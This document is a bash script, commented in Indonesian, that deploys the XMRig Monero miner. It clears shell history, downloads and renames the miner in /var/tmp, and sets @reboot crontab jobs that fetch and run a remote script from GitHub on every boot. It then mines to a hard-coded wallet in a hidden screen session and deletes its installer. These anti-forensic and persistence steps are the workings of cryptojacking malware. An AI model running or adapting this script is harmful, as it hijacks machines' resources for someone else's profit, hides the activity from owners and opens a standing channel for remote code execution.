#
history -c
cd /var/tmp
wget https://github.com/xmrig/xmrig/releases/download/v6.10.0/xmrig-6.10.0-linux-x64.tar.gz -O /var/tmp/mine.tar.gz
tar -xzvf mine.tar.gz
mv /var/tmp/xmrig-6.10.0/xmrig /var/tmp/mine
rm -rf xmrig-6.10.0 mine.tar.gz
cd /home
#run after rebot
#ganti wget (url) dengan url file lu
url="https://raw.githubusercontent.com/nacht0141/miner/master/mine.sh"
if crontab -l | grep "reboot cd /var/tmp && curl -O $url">/dev/null 2>&1 ; then
  echo "Cron already exist!"
  echo "Skiping..."
else
  echo "Creating crontab run after reboot.."
  echo "@reboot cd /var/tmp && curl -O $url
@reboot bash /var/tmp/mine.sh" | crontab -
fi
#start mining
printf "starting mining....\nkirim command screen -r untuk melihat mining\nctrl +D untuk keluar tanpa menghapus session\n"
ip=$(curl -s https://checkip.amazonaws.com | sed 's/\./_/g')
screen -dmS mnxmr ./mine -o sg.minexmr.com:443 -u 45vCvNhSG41LKu2wZaH4bDPPKMjwBMpPWWNo6tiRkgznN47ybvPoYbRht8GeXZ6v691P6tukYnh3i412mUKmn3Ey1Za3vma -k --tls --rig-id $ip
#remove installer
cd /var/tmp
rm -f mine.sh
